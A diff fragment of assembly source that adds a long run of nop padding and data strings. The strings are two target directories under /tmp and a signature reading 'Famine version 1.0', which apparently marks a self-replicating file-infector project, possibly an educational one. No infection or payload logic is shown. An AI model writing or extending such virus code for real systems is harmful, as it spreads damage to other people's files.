+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+
+
 dir1        db  "/tmp/test", 0
 dir1Len    equ $ - dir1
 dir2        db  "/tmp/test2", 0
 dir2Len    equ $ - dir2
 signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
+signature_len equ $ - signature
 _end:
-
-;debug
-tiret       db  "..---..",0
-back        db  10, 0
